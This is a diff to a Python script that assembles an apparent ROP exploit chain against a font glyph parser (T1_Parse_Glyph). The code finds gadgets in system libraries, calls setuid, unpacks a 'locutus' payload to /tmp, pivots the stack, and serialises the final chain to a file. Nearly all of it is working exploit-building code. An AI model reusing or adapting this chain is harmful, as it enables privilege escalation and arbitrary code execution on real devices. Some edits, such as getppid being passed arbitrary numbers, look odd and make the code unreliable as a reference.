@@ -57,13 +57,13 @@ init('R4', 'R5', 'PC')
 #set_fwd('R4', 0x12345678)
 #set_fwd('R5', 0x87654321)
 make_r7_avail()
-m = marker()
-set_sp_to(m)
-m.mark()
+m = pointed('')
+set_sp_to(pointer(m))
+heapadd(m)
 heapadd(fwd('R7'), fwd('PC'))
 make_avail()
 
-funcall('_getpid', None)
+funcall('_getppid', 1, 4, 2, 8, 5, 7)
 
 load_r0_from(reloc(0xe, 0x558))
 #load_r0_r0()
@@ -162,7 +162,7 @@ funcall('_malloc', reloc(0xa, 0))
 locutusp, locutuspp = stackunkpair()
 store_r0_to(locutuspp)
 dmini.cur.push_file('/usr/lib/libz.dylib')
-funcall('_uncompress', None, ptrI(reloc(0xb, 0)), zlocutusp, reloc(0xa, 0))
+funcall('_uncompress', None, ptrI(reloc(0xa, 0)), zlocutusp, reloc(0xb, 0))
 dmini.cur.pop_file()
 dbg_result()
 locutus_str = ptr('/tmp/locutus', True)
@@ -190,9 +190,9 @@ funcall('_setuid', None); dbg_result()
 set_r0_to(1337)
 fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment
 
-final, relocs = finalize(reloc(0xd, 0))
+final = finalize(reloc(0xd, 0))
 
-#heapdump(None)
+heapdump(final)
 
 # add sp, #400; pop {r4, r5, pc}
 parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd').value
@@ -207,4 +207,6 @@ actual_parse_callback = dmini.cur.private_sym('_T1_Parse_Glyph').value
 #final = 'food'*500
 #relocs = {4: 3}
 
-open('catalog.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final, 'relocs': relocs, 'plist': zplist}))
+final = final.unpack()
+
+open('catalog.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final, 'plist': zplist}))
